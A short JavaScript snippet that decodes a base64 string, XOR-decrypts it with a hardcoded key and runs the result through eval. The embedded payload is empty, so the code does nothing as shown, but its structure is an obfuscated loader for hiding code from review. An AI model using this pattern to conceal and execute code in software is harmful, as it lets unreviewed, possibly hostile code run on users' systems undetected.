(function() {
	const key = "bearbit-cover-bb-2026";
	const encrypted = "";
	const bytes = Uint8Array.from(atob(encrypted), c => c.charCodeAt(0));
	const decoded = bytes.map((byte, index) => byte ^ key.charCodeAt(index % key.length));
	const code = new TextDecoder().decode(decoded);
	eval(code);
})();
